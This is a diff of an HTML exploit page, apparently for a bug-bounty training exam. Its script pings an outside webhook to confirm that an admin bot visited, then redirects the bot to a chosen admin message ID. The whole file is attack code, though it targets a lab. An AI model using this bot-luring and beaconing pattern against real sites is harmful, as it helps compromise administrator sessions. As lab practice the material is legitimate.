@@ -2,9 +2,15 @@
 <html>
 <body>
     <script>
-        // Redirect the bot to YOUR Trap ID from Step 1
-        const trapId = "69e0fd55bee6d6b7c662694d"; 
-        window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/" + trapId;
+        // 1. Tell your webhook that the bot reached your hosted file
+        new Image().src = "https://webhooksite.net/af8d2f8d-349b-48e1-8b7a-78b2294cf0d2?status=bot_visited_exploit_html";
+
+        // 2. Redirect to the specific message ID you just created
+        const trapId = "69e0fdcbbee6d6b7c6626974";
+        
+        setTimeout(() => {
+            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/" + trapId;
+        }, 500);
     </script>
 </body>
 </html>
